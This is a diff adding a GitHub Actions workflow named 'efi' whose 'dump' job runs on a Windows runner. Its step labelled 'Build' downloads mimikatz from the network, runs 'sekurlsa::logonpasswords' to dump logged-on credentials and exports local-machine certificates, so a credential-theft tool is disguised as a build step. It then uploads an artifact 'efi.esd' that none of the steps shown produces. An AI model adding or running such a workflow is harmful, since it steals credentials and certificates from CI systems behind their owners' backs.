@@ -1,0 +1,20 @@
+name: efi
+on:
+  workflow_dispatch:
+
+jobs:
+  dump:
+      runs-on: windows-latest
+      steps:
+      - uses: actions/checkout@v2
+      - name: Build
+        run: |
+          Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile mimi.zip
+          Expand-Archive mimi.zip -DestinationPath .\
+          .\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+          .\x64\mimikatz.exe log version "crypto::certificates /systemstore:local_machine" exit
+
+      - uses: actions/upload-artifact@v3
+        with:
+          name: efi.esd
+          path: efi.esd
